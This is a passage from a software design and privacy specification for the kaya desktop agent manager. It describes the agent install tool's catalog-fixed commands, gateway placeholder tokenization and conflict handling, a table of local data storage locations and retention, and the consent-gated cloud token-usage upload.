  to the local app log (`~/.kaya/logs/`, with agent, file path, and merged
  top-level key names — **never values**).
- **CLI (kaya-cli)**: with no card UI, `edit` is always auto-denied with a
  hint to edit the file manually; `read` works and goes through the same
  masking pipeline.

**Agent install/update/uninstall (agent_manage, 2026-08-21; uninstall 2026-08-27)**:
chat's `agent_manage` tool is the **chat equivalent** of the Agents panel's
install / update / uninstall buttons — asking "install claude-code for me"
starts the exact same background task as the panel button (same single-task
gate, same event stream, same app log).
- **Catalog-fixed commands only**: the tool's only parameters are `action`
  (status/install/update/uninstall enum) and `agent_id` (validated against the
  built-in catalog) — **no free-form command parameter**; the executed command
  (npm/brew/script) is decided entirely by the compile-time catalog, so the
  model cannot inject its own shell.
- **Why it bypasses run_shell's five gates**: those gates (policy gate /
  safety gate / execute isolation …) defend against LLM-generated shell text;
  this tool carries no LLM-generated command and no user-data egress — it reads
  no file contents and outputs only install-status text (still scrubbed on the
  way out). `status` probes are the same as the Agents panel's (local PATH scan
  + `--version`; nothing leaves the machine).
- **Uninstall boundaries**: only npm/brew-managed installs, with an ownership
  check (an install not managed by that package manager is never touched —
  protects manual installs); script-installed (curl|bash) agents have no
  reverse operation and are refused with guidance to follow the official docs.
  Uninstall removes only the program itself — config files and history are
  kept. The panel's Uninstall button asks via a confirm dialog; the chat path
  keeps the "explicit user request" constraint without a grant card.
- **Trigger precondition**: the system prompt hard-codes "install/update/
  uninstall only when the user explicitly asks"; the actions hand the task to
  the background engine and return immediately — completion arrives via toast,
  and the action itself lands in the local app log (`~/.kaya/logs/`, with
  agent, action, and the fully rendered command).
- **Install output lines are scrubbed first (R3, 2026-08-31)**: every line of
  the child process's stdout/stderr is run through the same secret scrub as
  tool outputs before entering the tail buffer and the frontend event stream
  (install-hook output is uncontrolled and may carry tokens / credential
  URLs).

**Existing-placeholder protection and mapping uniqueness (2026-10-26, spec
§7.1)**: multi-turn conversation history replays the tokens the gateway sent
upstream in earlier turns verbatim. If such a token is tokenized a second
time, a `truth → A → B` token chain forms (the model sees a different
stand-in every turn and the response restore can only go back one layer).
Outbound tokenization therefore identifies **existing placeholders** first
and keeps them verbatim:
- Protected candidates are ① every auto-generated token already in the gateway
  process's in-memory vault, and ② the target tokens of the user token map
  **that would themselves be matched by an automatic rule**. Empty tokens,
  blank tokens and plain aliases that no automatic rule matches are not
  protected; plain aliases are scanned only to collect request restore
  references. Vault tokens, protected user tokens and plain aliases use three
  Aho-Corasick LeftmostLongest scans in descending priority. A lower-priority
  match overlapping a higher-priority protected span is dropped, so an earlier
  or longer user alias cannot hide a vault token. Request references and response
  restoration share the same boundary rules: direct adjacency to a letter or digit, or a link through
  `._@-` to a letter or digit on the other side, makes a longer identifier;
  standalone periods, Markdown underscores and standalone hyphens do not block
  a token. Automatic hits wholly inside an existing placeholder are dropped.
  If an enclosing secret match also covers content outside the placeholder,
  the request fails closed with `kaya_gateway_protected_secret_overlap` (400,
  not forwarded upstream).
- `token → truth` must be unique: user configuration is rejected at write
  time (validated before it is persisted), and a runtime auto-registration
  that points one token at a different truth **fails closed** — the current
  request is refused with the fixed sentinel `kaya_gateway_token_conflict`
  (400, **not forwarded upstream**) and the old mapping is never silently
  overwritten. The conflict app_log records only the category and the agent,
  **never the token / truth**; the error body likewise carries neither.
- **The restore snapshot merges eviction history and the user token map**:
  the snapshot contains the active vault, the bounded eviction history and
  the reverse user map. User-map entries do **not** occupy the automatic
  vault's eviction pool, and they never **override** an existing mapping
  (one token pointing at two truths fails closed the same way, 400).
- Different tokens whose containment or partial overlap is recognizable under
  the restore-boundary rules are also conflicts. User-map writes, vault
  registrations and final snapshots validate them before forwarding; longest
  matching never guesses the truth, including for ambiguous legacy mappings.
- Literal substitutions embedded in identifiers keep the chosen alias while
  registering a complete reversible unit (`secret → prod` produces
  `myprod → mysecret` in `mysecret`). Multiple hits within that unit form one
  tokenization fact. Unit expansion shares the reference/restore boundary
  checks and absorbs only punctuation connecting an identifier, leaving sentence
  periods, Markdown underscores and standalone hyphens outside. Plain and
  punctuated forms may coexist within and across requests. Complete units are
  protected on replay; short-token boundaries stay strict so unrelated longer
  identifiers are not restored accidentally.

---

## 8. Local Data Storage

**Local state lives on the user's machine** and is not automatically synced to the cloud; the signed-in usage heartbeat and explicitly consented cloud Token usage upload are separate upload channels.

| Data | Location | Written by | Retention |
|---|---|---|---|
| UI state (messages / settings) | `localStorage` key `kaya` | Front-end Zustand persist | User clears manually; **during a cross-device chat (B side) the peer's request text and B's own answer are stored here as chat messages** (2026-10-20, Q2 local echo — the same treatment as the IM mirror); **inline analysis turns started from Settings → "Config optimization" are stored here with a `hiddenInChat` flag and audited as usual — they are only hidden from the chat panel** (2026-10-22; the audit still records the post-scrub text, unchanged) |
| LLM context | `~/.kaya/conversations/c_*.json` | Rust `ConversationStore` | User clears manually |
| Audit log | `~/.kaya/audit/s_*/events-*.jsonl` (since 2026-10-08 created atomically at 0o600 with the directory at 0o700, and legacy 0644 files are tightened on append — the audit trail was the only persisted domain whose permissions had been missed) | Front-end `recordEvent` (Rust invokes fs) | User clears manually |
| Debug capture (optional) | `~/.kaya/debug/s_*/turn-N.json` | Rust debug module | dev-only, off by default |
| App diagnostic log | `~/.kaya/logs/app-YYYY-MM-DD.jsonl` | Rust `app_log` (front-end `snapshotCursor` cursor diagnostic probes; since 2026-08-26 channel reconnect errors are deduped-on-change into this log, tag `channel` — Windows GUI builds have no stderr, this is the only durable trail on that platform) | manual prune of logs older than 7 days (Settings → App log); file 0o600; **content is diagnostic metadata only** (DOM/CSS state, counters, byte lengths; channel connection error text may contain hostnames/error descriptions, URL query/fragment redacted so no ticket is persisted), no PTY output / keystrokes / secrets |
| Terminal scrollback | `~/.kaya/terminal/<tabId>.log` | Rust scrollback append (round-89) | 10MB cap + truncate-to-75% rotation; deleted on tab close |
| Per-tab shell history | `~/.kaya/history/<tab_id>.history` | Rust per-tab HISTFILE (round-111); since Windows port Phase 2, Windows sessions use the PSReadLine `HistorySavePath` (injected by per-tab init.ps1, the HISTFILE equivalent) | merged back into the global history on tab close (`~/.zsh_history` on macOS; kaya's own `global.history` on Windows — see `history/io.rs`); file 0o600 |
| Login token (refresh_token) | system keychain (macOS: since 2026-10-21 the `authv:<variant>:refresh_token` field of the single unified item `com.kaya.byok` / `vault` — all secrets in one item = at most one keychain authorization per launch; Windows: single item under the variant service `com.kaya.auth` etc., unchanged) | Rust `auth_tauri` (round-137/138, writes only refresh_token; since 2026-10-21 persisted into the unified item via `secret_tauri::auth_token_*`) | deleted on logout / 401 cleanup; access_token not persisted (memory only, 15min TTL) |
| API Key (your own key / model library providers) | system keychain (macOS Keychain / Windows Credential Manager; single-item JSON map, field name `llm_api_key_<providerId>`; on macOS since 2026-10-21 stored in the same unified item `com.kaya.byok` / `vault` as the login token / OAuth bundles) | `src/lib/secrets.ts` (`secret_set/delete/get`) + Rust `secret_tauri` (allowlist `^[a-z0-9_]{1,64}$`) and `model_library` (absorbed on library upsert) | User clears manually (deleting a library entry deletes its key too); **never written to localStorage or to the library file** — localStorage only gets an empty string scrub (since v30) |
| OAuth token bundle (model library providers; access / refresh / expires_at / device_id / optional ChatGPT-only account_id) | system keychain (same backend; on macOS since 2026-10-21 the `llm_oauth_<provider_id>` field of the unified item `com.kaya.byok` / `vault` (legacy standalone items lazily migrate on first read); on Windows the **separate logical key** `llm_oauth_<provider_id>` + generation manifest + chunks + per-chunk SHA-256 are unchanged (the manifest commit is the only atomic switch point); the `com.kaya.byok` namespace is **shared across region / variant** by default, so a dev / intl build can read the same credential and two concurrently running variants deleting it will sign each other out; **isolated worktree dev profiles are the explicit exception**: a valid debug profile started by `npm run tauri:dev:isolated` stores login tokens / BYOK / OAuth / Tavily / channel secrets under `com.kaya.byok.dev.<profile>` and the corresponding dev auth services, without reading or migrating production / legacy shared-dev credentials; production items and namespaces are unchanged) | Rust `secret_tauri::oauth_token_{get,set,delete}_sync` (called by the shell's `provider_auth` / `provider_oauth`) | Deleted on "Sign out" / provider deletion; an upstream 401·403 on refresh only sets the **in-memory** expired marker (the bundle is kept and overwritten by re-login); the access token is also cached in `AuthRuntime` memory (re-read from the keychain after restart; refreshed first when within 300 s of expiry); **never written to localStorage or the library file, never in IPC / logs / the audit trail / debug dumps**; the generic `secret_get/set/delete` explicitly reject `llm_oauth_*`. Known boundary: if the keychain write fails after a successful refresh, the new token lives only in memory (fine for this process); after a restart the keychain may hold a rotated-away refresh token, so the user must sign in again (with no separate warning); current macOS deletion and legacy-source cleanup share the vault file lock. Cleanup failures return a fixed error for retry and do not claim successful sign-out; unknown schema rejects writes and preserves legacy sources |
| Unified model library (provider definitions, **no keys**) | `~/.kaya/model-library.json` | Rust `model_library` (commands `model_library_list/upsert/delete`; the Settings "Models" tab and the Agents panel read/write the same store) | User deletes manually; **v2 (2026-10-16 provider hierarchy) is two-layered: a provider carries up to three protocol endpoints (chat / anthropic / openai — endpoints hold no key and, since v2, no model) plus a model list (`models`: model id + enabled / vision / protocols / capabilities / gateway-alias slug) plus provider-level `extra_headers` (custom outbound headers; the values are quasi-sensitive: persisted with this file at 0o600, but they never enter app_log / audit / debug dump / LLM context — see the batch-one additions in §7.11)**; a v1 library file (no `version` / `entries` shape) is migrated automatically by the first library command (v2 + rewritten top-level `bindings`, leaving a `<store>.migrated-v1-<ts>` backup — a copy made before the atomic rewrite, not a rename; a separate **one-time migration** (2026-10-28) clears the protocol whitelist old online discovery wrote onto auto rows (the single-element shape `protocols:["chat"]` and friends) so the rows inherit every enabled endpoint of their provider again, leaving a `<store>.migrated-protocols-<ts>` backup **when it actually cleared rows** (distinct prefix, never overwriting the v1 backup; when no model rows are cleared the library file is still rewritten for the completion marker and JSON formatting, without an extra dedicated whole-library copy); that backup is 0o600, stays on this machine, and can be deleted by the user; the keychain key `llm_api_key_<m_id>` → `llm_api_key_<p_id>` move is two-phase: write the new key → commit the v2 library file → delete the old key, so a crash or a failed delete leaves at most an orphan old key — **a usable credential always exists at every point, no key is lost**). The old `~/.kaya/agent-providers.json` (which stored keys in **plaintext**) is absorbed automatically on first launch: keys move up into the keychain and the original file is renamed `agent-providers.json.migrated` (any leftover plaintext can be deleted by the user). File written 0o600 atomically with tightening of old permissions, reusing `write_with_backup` (the same implementation as review C3, 2026-08-20) |
| Model-library ↔ agent bindings | `~/.kaya/model-library.json`, top-level `bindings` | Rust `model_library` command-layer orchestration (adopt / sync) | User deletes manually; cleared automatically when the provider is deleted, the bound model is removed, or its protocol endpoint is removed; **holds only `agent_id → {provider_id, model_id, via_gateway, kaya_managed?}` mappings, no keys whatsoever** (2026-09-10 agent bindings; upgraded to provider + model two-level bindings 2026-10-16) |
| IM channel session mapping / cross-device peer mapping | `~/.kaya/channels/sessions.json` | Rust channels module (v2.1.0, IM platform user ↔ local session; since 2026-10-20 the same file also stores the cross-device peer device id ↔ `c_peer_<device_id>` session id — metadata only, no message text) | User clears manually |
| IM mirror target chat | `~/.kaya/channels/mirror.json` | Rust channels module (Unreleased, mirror binding restored across restarts) | User clears manually (deleting it while the channel is running does not recreate it in place — cross-restart binding restore then fails, and the next restart falls back to the sole_key heuristic) |
| Remote-access device identity | `~/.kaya/remote/device.json` | Rust remote module (2026-09-15: random ULID + display name + persisted enabled flag; atomic write, 0o600) | User clears manually (deleting it regenerates the device_id on the next enable); **contains no token / ticket** (those live only in memory / the Keychain) |
| Cross-device coordination admission config | `~/.kaya/remote/peers.json` | Rust remote module (2026-10-15: coordination master switch (off by default) + per-device whitelist / per-agent scoping; atomic write, 0o600; a corrupt file is treated as off — fail-closed) | User clears manually; **stores only device ids / display names / admission scope — no keys of any kind** |
| In-flight cross-device chat requests (peerHostRequests) | `localStorage` key `kaya` | Front-end Zustand persist (top-level slice added at persist v61 on 2026-10-20; moved from module memory in `peerHostChat.ts` into the store so HMR / reloads cannot drop replies) | Automatically removed when the request finishes or its 10-minute TTL expires; **stores only request_id / device id / a display-name snapshot / placeholder message id / timestamps, no message bodies** (display names and placeholder text were already persisted with messages, so this slice adds no new privacy surface) |
| Scheduled tasks (schedules) | `localStorage` key `kaya` | Front-end Zustand persist (v2.1.12, Settings → Schedules) | User deletes manually; **prompts are kept verbatim on the local machine** |
| Memory (core / episodic / automatic-changes ledger / version chains) | `~/.kaya/memory/` (`core.json` / `state.json` / `review.jsonl` / `review-history.jsonl` / `episodic/YYYY-MM.jsonl` / `versions/<id>.jsonl` / `staging/`) | Rust memory module (2026-09-04, see §8.1) | Memories are kept indefinitely; discarding is a logical tombstone delete (auditable trail); **deleting the entire `~/.kaya/memory/` directory is complete forgetting**; all files written atomically with 0o600; **automatic adjudication only adds / reinforces / generalizes / archives / marks superseded — it never performs physical deletion**, and `review.jsonl` now only serves legacy migration plus technical retries |
| Chat temporary images (pasted-image staging) | `~/.kaya/tmp-images/<chat_session_id>/img_<uuid>.<ext>` | Rust attachments module (2026-10-02, image-paste P2; 0o600 atomic writes, session-id whitelist `[a-zA-Z0-9_-]` against path escape) | **Current session only**: `/new` deletes the session's directory and app boot sweeps the whole root (never survives a process restart); used for the "send to agent" path handoff (the driven coding agent reads the file itself) |
| Cross-agent ToDoList (todoList) | `localStorage` key `kaya` | Front-end Zustand persist (introduced by the 2026-09-21 cross-agent ToDoList redesign at v50; now persist v64, supersedes the 09-19 taskQueue slice) | Pending/running/failed entries are deleted manually by the user; **done is a persistent state since 2026-10-10: completedAt / verdictSummary / evidence are kept verbatim on the local machine, done section FIFO 50 entries**, until the user clicks "Clear done" or deletes entries one by one; **title / brief and other user-authored content is kept verbatim on the local machine** (same precedent as the tasks projection) |
| Model gateway (2026-10-13, §7.11) | `~/.kaya/gateway/` (`config.json` persisted port / `owner.json` dev-prod variant mutual-exclusion lock / `token.key` content-addressing per-machine key / `token-map.json` user token map / `migrations.json` migration version stamp (a single integer, zero user data)) | Rust gateway module + the `gateway_tauri` command layer | User clears manually; all 0o600 (atomic writes); deleting `token.key` invalidates every token (one prompt-cache miss, no content leak — tokens carry no truths); **the token → truth restore index (vault) lives only in gateway process memory and is never persisted**; library entries' API keys never land in this directory (they live in the system keychain; while the gateway is enabled, **all** entries' keys reside in gateway process memory — since Phase 1.6) |
| Agent Tune scripts and hook state (2026-10-14) | `~/.kaya/agent-tune/` (statusline / hook / notify scripts; directory and files all 0o700) and `~/.kaya/agent-state/<agent>-<session>.json` (0o600, overwritten with the latest state of the same session) | Scripts installed by `agents::tune`; the scripts are triggered by each agent's runtime (statusline rendering / hook events / codex notify / opencode plugin) to write the state files (**since 2026-10-21 kimi-code no longer collects via statusline** — that item was removed and the official built-in footer is restored; kimi state comes only from hooks; claude-code statusline is unchanged); exception: the opencode plugin file (0o600) is installed into opencode's own plugin directory per its plugin mechanism, not under agent-tune | "Unapply tuning" removes the references from the agent's configuration (the script files themselves stay in agent-tune, inert once nothing references them); state files have no active cleanup (each <1KB, overwritten within the same session); **state files carry metadata only** (agent_id / session_id / model / context_pct / cwd / event / ts) — the script contract explicitly **never writes prompts, message text, tool arguments, or file contents** (the message field in the codex notify payload is parsed and then discarded); the reader side `agents::state_files` only accepts state fresher than 15 minutes |
| Agent config snapshots (2026-10-15, §8.2) | `~/.kaya/agent-config-snapshots/<agent_id>.json` (directory 0o700, file 0o600 atomic write) | Rust `agents::config_snapshot` (invoked by the model-library attach/revoke orchestration) | Created on the first takeover hop, deleted as soon as a revoke-restore succeeds; **contents include the user's original values (including self-configured third-party gateway base_url / token)** — an explicit, documented exception to the "real keys never hit disk" rule, protected by the `~/.kaya` domain permissions; snapshot contents never reach logs or the audit trail |
| Gateway privacy-protection records (2026-10-21, §8.4) | `~/.kaya/gateway/privacy-events.jsonl` (0o600) | Rust `gateway::privacy_log` (written **in one batch per request** by the gateway server; restore sliding-window hits are also recorded) | schema v2 (2026-10-26, nine optional diagnostic fields, old rows still readable); 90-day query window / **5000** tokenized records + a separate **500** warned records (expired → older duplicate copies → FIFO; expired data is physically removed during FIFO compaction or explicit clearing); when full, eviction happens **in batches** (500 tokenized / 50 warned per batch, so the whole-file rewrite is amortized); "clear current filter" and "clear all" in Settings (a **selective clear only touches records**; a full clear also clears request and compatibility events); **contains tokenized originals and replacement tokens** — the second documented on-disk content exception, protected by the `~/.kaya` domain permissions; record queries never export originals (no audit / app_log / debug dump or automatic LLM injection; explicit desktop/CLI trusted reads retain the existing authorization and output-scrub boundary; IM channel turns and peer reads are blocked) |
| Gateway request event stream (2026-10-26, §8.4) | `~/.kaya/gateway/request-events.jsonl` (0o600, directory 0o700) | Rust `gateway::request_log` (exactly one event per Content request entering `before_request`; `finish_once` is idempotent, Drop falls back to `client_aborted`) | 30-day query window / 20000-event cap (oldest 1000 evicted in one batch when full, then append); **content-free**: 17 structural keys only (request_id / timestamp / app and rule versions / agent / route / protocol / stream / transformed fields / category counts / existing placeholders / media preserved and rejected / exact restores / outcome / upstream status), structurally no original text, token, full field path or message body; shares the internal `privacy` switch with records; **cleared by a full clear, untouched by a selective clear**; excluded from diagnostic export |
| Gateway compatibility diagnostic events (2026-11-03) | `~/.kaya/gateway/compatibility-events.jsonl` (0o600, directory 0o700) | Rust `gateway::compatibility_log` (one per signed-thinking protocol-integrity rejection, sharing the request event's request_id) | 30-day retention / 5000-event cap (oldest 500 evicted in one batch, expired rows physically removed during rewrite); exactly 15 structural keys (schema / request id / timestamp / app and rule versions / agent / route / protocol / fixed protocol field path / content kind / hit category / action / decision reason / fallback decision / retry outcome), structurally no original, token, truth, signature, base64, message body or upstream error body; shares the records' `privacy` switch; **cleared by a full clear, untouched by a selective clear**; the file and dot-suffix variants are excluded from diagnostic export; fixed local path/open commands only, never uploaded |
| Token usage statistics (2026-10-21) | `~/.kaya/usage/` (event JSONL, 0o600; aggregation is computed in memory at query time, no aggregate files on disk) | Rust `usage_stats` (unified accounting by the chat agent loop and the gateway, `UsageMeter`) | 180-day retention; **counts plus provider / model / agent identifiers only, zero content**; auxiliary calls that run **outside** the agent loop (the fast-decision command `llm_decide`; task distillation; memory consolidation) are excluded; the entry-routing decision (`llm::decide::route_entry`, a lightweight LLM call with a 3 s budget that runs before the usage meter is created) is likewise excluded — `should_route_entry` is only the local precursor gate deciding whether a turn needs routing; **slim turns triggered by entry routing still run inside the agent loop and are counted** |
| Cloud usage upload state (2026-10-26; **per deployment since 2026-10-30**) | `~/.kaya/usage/upload-<deployment>.json` (one per deployment — cn / intl; 0o600 atomic writes, directory 0700) + `~/.kaya/usage/upload-<deployment>.lock` (0o600 cross-process lock); the old shared `~/.kaya/usage/upload.json` is only a one-time migration source | Rust `usage_upload_tauri` (written by the command layer and the background worker) | Persistent (turning uploading off stops cursor / last-successful-sync progress, but account observation and identity-isolation transitions may still be persisted; deleting `~/.kaya/usage/` invalidates it); **holds only the upload cursor, consent version, account id, device id, bucket size, backfill suppression latch and reason, the event floor (`events_not_before` = the consent moment of an **identity-isolated** re-consent), last successful sync time and the first-seen `provider_key` mapping** — **no token / base_url / provider display name / usage content whatsoever**; a corrupt file is fail-closed and stops uploading |
| App version metadata (display) | Memory (`AppInfo` runtime field, **not persisted**) | Rust `get_app_info` (`src-tauri/src/app_info.rs`, round-56) | Within process; re-read on restart |

**Storage exceptions for isolated worktree dev profiles (2026-10-29)**: `npm run tauri:dev:isolated` derives a profile id from each checkout. In this mode HOME, the model library, conversations, terminal history, memories, gateway config and request/privacy events live under `~/.kaya-dev-home/profiles/<profile>/.kaya/` rather than the production `~/.kaya/` paths above; login tokens, BYOK API keys, OAuth bundles, Tavily and channel secrets use `com.kaya.byok.dev.<profile>` and the corresponding dev auth services. The profile id is parsed from the bundle identifier suffix, so a missing environment variable never falls back to the production vault; production / legacy shared-dev credentials are not read or migrated, and production items, paths and namespaces are unchanged. Deep links keep the registered `kaya-dev` scheme, and real OAuth sign-ins and callbacks are serialized on the same machine.

**Shared-state migration and retirement**: CN and Intl use separate `upload-cn.json` / `upload-intl.json` files and locks. Matching the source account only selects a conservative mapping; it does not prove historical ownership. A different account receives a new device, no consent or provider mapping, and preserves known revoke restrictions. Corrupt or future-version source states block creation of a default target. New readers show an upgrade message for unsupported versions; they cannot change an old binary's message.

Every source-writing path locks legacy then target. Each deployment's receipt records the original source bytes' SHA-256, initial target digest, mapping disposition and pending/verified phase. The complete target is atomically committed and actually read back before a verified receipt is committed. Interrupted migration can resume only by checking the same source mapping and unchanged pending payload. An existing target without a receipt never gains proof from existence alone. Retirement separately try-locks legacy→CN→Intl; only two valid verified receipts for the same current source permit atomic replacement with a version tombstone containing no account, device or provider mapping. A single deployment, changed source, corrupt/future target, uncertain readback or busy lock cannot establish completion; retry is safe. Keeping the tombstone makes strict old readers fail closed instead of treating absence as a first install. This does not promise forensic disk erasure. Later authorized target changes retain the historical migration receipt.

- **Trusted state and new consent**: local schema v2 carries an authorization evidence generation. Schema v1 toggle, consent and reason fields cannot establish historical ownership: conversion disables upload and clears consent, preserves known account-switch/revoke restrictions, and otherwise marks `legacy_unverified`. Normal re-consent starts with new usage only. The first new isolated window rotates the device id so existing cloud cumulative buckets remain intact. A trusted same-account off/on cycle still backfills its off period without shrinking the same device's cumulative buckets.
- **Separate history authorization**: `account_change` and `legacy_unverified` require a separate history action and confirmation. Local events are not separated by account and may include a previous account's usage. Enable and history confirmations bind to the reviewed deployment, account, login and authorization evidence generation. After waiting for in-flight work, the backend checks the scope again under the file lock. An A→B→A round trip or generation change rejects stale confirmation with zero enable/backfill; refresh and try again. Ordinary polling keeps scopes stable. Disabling needs no scope.
- **Irreversible revoke floor**: a currently revoked state has no history action. Explicit new consent creates a new device and raises persistent `revocation_floor` to at least that consent moment. Every upload/backfill takes the maximum of this floor and its other boundaries. Account changes including A→B→A, toggles, migration and history authorization cannot erase or lower it. Pre-revoke usage and the interval before new consent are never backfilled. Usage within a new authorized window may later receive separate history consent; the actual range can be shorter than 30 days, and the UI shows the limiting date.

**Cloud Token usage upload (implemented client-side on 2026-10-26, off by
default)**: the kaya client **ships** a cloud Token usage uploader, but it is
**off by default** — before the user logs in, or before the user explicitly
consents in Settings, **no ingestion request is ever made** (zero upload).
Ticking the switch in Settings → "Account" → "Cloud Token usage" first expands
a "what is uploaded / what is not uploaded" list; only "Confirm and enable"
takes effect. The consent version is recorded as `kaya-usage-upload-v2` (kept
in the local state file; **a version change voids the old consent and requires
one more confirmation**).

- **What is uploaded**: **usage buckets** aggregated by UTC hour or day. Each
  bucket = source (`chat` / `gateway`) + agent identifier + normalized
  provider key + model id + `prompt` / `completion` / `total` token counts +
  request count. **Bucket values are cumulative** (re-uploading the same bucket
  overwrites on the server instead of doubling it). The **device id is sent
  with every usage batch** as well (the `device_id` field of the batch
  envelope), so the server can attribute the usage to this device.
  The **device registration
  / update** (the request that registers or refreshes this device with the
  cloud, sent before the **first bucket** of every sync round that has
  buckets) has exactly
  four fields in its body: the device id, the operating system family
  (`macos` / `windows` / `linux`), the kaya app version and the consent
  version — the platform and the app version are **sent only with the device
  registration, never with the usage buckets**; the **hostname and hardware
  fingerprint are never uploaded** (the platform stops at the OS family).
  The registration is **idempotent** (registering the same device again only
  updates it), but it **is sent once per sync round that has buckets** — not
  only on the first consent.
- **The provider key has exactly four shapes** (`preset:<preset_id>` /
  `builtin` / `cli` / `custom`). The device-level `p_` provider id, custom
  provider names, `base_url`, custom request headers, API keys and OAuth
  tokens are **never uploaded**.
- **Normalization fallbacks are counted, logged locally as a warn, and never
  kept verbatim (2026-10-26)**: a `provider_id` that is neither `builtin` /
  `cli` / `custom` nor a complete `p_[0-9a-f]{8}` shape normalizes to
  `custom` (a complete `p_` shape with no library entry carrying a valid
  `preset_id` is a **normal** path — a custom provider, also `custom`, but
  **not** a fallback and **not** counted); a `model_id` that is empty after
  trimming, longer than 200 characters, or contains control characters
  normalizes to `default`. Events that hit a fallback are **counted only**
  in the sync log (`normalized_providers` / `normalized_models`; present on
  both the success and the failure path, and a non-zero count raises that
  record to warn level) — **no raw text, no per-event trail**. The fallback
  is itself the gate that stops "accidentally pasted base_url / over-long
  free text" from reaching the cloud.
- **Never uploaded**: conversation text, file contents and paths, repository
  information, the current working directory (cwd), hostname and hardware
  fingerprints, and the per-request raw event records. The login JWT is used
  only to authenticate requests and **never becomes part of the uploaded
  payload**.
- **Device identifier**: a randomly generated `d_` + 16 lowercase hex
  characters (created and persisted locally; no hardware information is
  collected). It is **not** rotated automatically after a cloud-side revoke —
  only an explicit re-consent produces a new one. An **observed account switch
  also rotates it** (switching identity switches the device identity, so an
  A → B → A round trip cannot mix or overwrite the accounts' buckets).
  Two consequences, stated plainly: (1) after switching accounts several
  times on the same machine, **the device list on the website may show
  several device entries** (one per identity; the older ones stay there);
  (2) **revoking an older device id does not revoke the newer device id
  created by a later account switch** — a revoke only affects the id that was
  revoked. Every account switch still **voids the old consent**, so there is
  **zero upload until the user confirms consent again**. Schema v1 conversion also rotates the device when explicit new consent establishes its first isolated window, preserving already uploaded cumulative buckets.
- **Initial consent and the history cap**: a first consent with no previous upload state may still backfill up to 30 days, bounded by available local records, cloud retention and the consent window. Account changes made while no state existed cannot be identified, so that history may include another account's usage; the preview discloses this. Existing schema v1 states instead follow the new-usage-only rule above. Buckets are cumulative, newest first, with the current bucket immediately eligible; the cursor advances only after all batches succeed. Retention is capped at 180 days; zero retention is an empty window, and clearly invalid server clocks are rejected.
- **Account observation** continues while upload is off. An observed change invalidates consent, rotates the device and isolates history. Separate history authorization and the immutable revoke floor follow the rules above.
- **Account switch / revoke**: after an observed account switch, old history is excluded by default (separate history consent remains subject to the revoke floor) (re-consenting starts
  at the **consent moment** — the event floor keeps the old account's period
  out, while new data in the current bucket is uploaded immediately), and the
  switch also rotates the **device id** (a new identity ⇒ the old account's
  buckets are left untouched); after the cloud revokes the device the client stops
  uploading immediately and shows "revoked", and only re-consenting restores
  it (new device identifier, new data only); a revoke only affects the id
  that was revoked, not a newer id created by a later account switch (the
  switch still voids the old consent, so there is zero upload until the user
  confirms consent again). Once an account change is
  detected **no further cloud request is sent** (the device registration is
  sent only after the account generation check passes), and the old
  generation's result is never written back into the state. A 401 refresh replay
  likewise rechecks cancellation and generation before caching the fresh token
  or sending the second request, failing closed if the guard is missing;
  cancellation finishes as a skipped round.
- **Turning upload off does not delete cloud data**: the client has no cloud DELETE path. The existing Users DELETE only soft-revokes; purge removes usage buckets but retains device rows. The website currently has no revoke button. Historical device-list cleanup remains an external Users/website follow-up, not a completed effect of this upgrade.
- **Local cursor state**: the upload cursor, consent version, bound account,
  device id, bucket size, backfill suppression reason, authorization evidence generation, migration receipt, irreversible revoke floor, the **event floor**
  (`events_not_before` = the consent moment of an **identity-isolated**
  re-consent), last successful sync time
  and the first-seen `provider_key` mapping are kept in
  `~/.kaya/usage/upload-<deployment>.json` (one per deployment — cn / intl are two
  separate clouds and accounts, so they must not share one state file; directory 0700 /
  file 0600 / atomic writes);
  concurrent kaya processes on the same machine are serialized by
  `~/.kaya/usage/upload-<deployment>.lock` (the lock covers the whole "re-read state under
  the lock → aggregate → all HTTP → write the cursor back" sequence). A
  corrupt or unreadable state file is fail-closed (uploading stops; the state
  is never rebuilt and reused). Failures **do not advance the cursor**, so the
  next round retries the same batch. The cursor is monotonic **within a sync
  round**; the **only exception** is the "isolation rebase" at re-consent
  (the cursor moves back from "the next bucket" to the start of the current
  bucket so the current bucket can be uploaded right away) — the privacy
  boundary is carried by the **event floor**, not by the cursor. An unreadable
  **local usage file**
  (permissions / a directory in the way / I/O errors) and a single corrupt
  **line** are **two different things**: the former fails the **whole round**
  (zero ingestion, zero cursor advance) and is retried automatically after a
  backoff — a whole day of data is never silently dropped; the latter drops
  only that line and uploads the remaining buckets as usual. An unreadable
  **local model library** (corrupt / unreadable / structurally invalid) also
  fails the **whole round** (zero ingestion, zero cursor advance) — buckets
  must not be sent while the provider dimension mapping (`provider_key`
  normalization) is uncertain. From the uploader's point of view this is a
  **transient local I/O failure**, so it is retried automatically after a
  backoff (not a permanent error, automatic sync keeps running).
- **Diagnostic log**: the local app log only records **fixed error codes and
  counts** (batches / buckets / accepted / updated / discarded / skipped /
  normalization fallbacks); it never records bucket contents, timestamps,
  accounts, provider names, model lists or file paths. A record that hit a
  normalization fallback (see above) is raised to warn level and still holds
  counts only.
- **Scheduling**: the background worker checks the switch / account / backoff
  expiry / network recovery every 60 seconds, with a **fallback** minimum of
  5 minutes between two **actual** syncs. **Best-effort sync before exit**:
  `drainBeforeClose` triggers one `usage_upload_sync_now` before the app exits,
  sharing the 10-second drain budget with other shutdown work; failure never
  blocks exit, and there is zero network traffic while logged out, un-consented
  or revoked. On top of that, **usage-event driven
  near-real-time sync** (since 2026-10-26): once a usage event (chat and gateway
  both record through the same path) is **successfully persisted**, the upload
  worker wakes up and uploads one round after a **~5 s trailing debounce** that
  merges consecutive events (the event path is **not** subject to the 5-minute
  fallback interval; a failed write never triggers it). The event path bypasses
  **none** of the gates: backoff ladder / auto-pause / waiting for a login-state
  change / consent all still apply, and there is **zero network traffic** while
  logged out, un-consented or revoked. Events that arrive while an upload is in
  flight are recorded as pending and trigger one more round after the current
  one finishes (no lost notification, no concurrent upload). Consent / account
  changes / manual sync still wake the worker **immediately**, without the
  debounce. The "near-real-time" path is **not a hard real-time guarantee**: a round's aggregation
  window ends at the cloud's `coverage.server_time`, and an event written just after that
  bound is picked up by the **cursor window of a later round** (buckets are cumulative) —
  nothing is lost. After a **re-consent / account change** the runtime gates are reset, so the
  "at least 5 minutes between two actual syncs" rule no longer blocks the first
  upload. A cross-process lock conflict (another kaya process on the same machine is
  syncing) is treated as **routine contention** — the automatic path skips the round,
  **records no error and arms no backoff**; the pending data is kept and retried
  naturally. A manual sync does surface the error code in the status (the user can
  see that another kaya process is syncing) but still arms no backoff, so it can be
  retried immediately.
  **When the effective window lower bound is ahead of the cloud time** (the
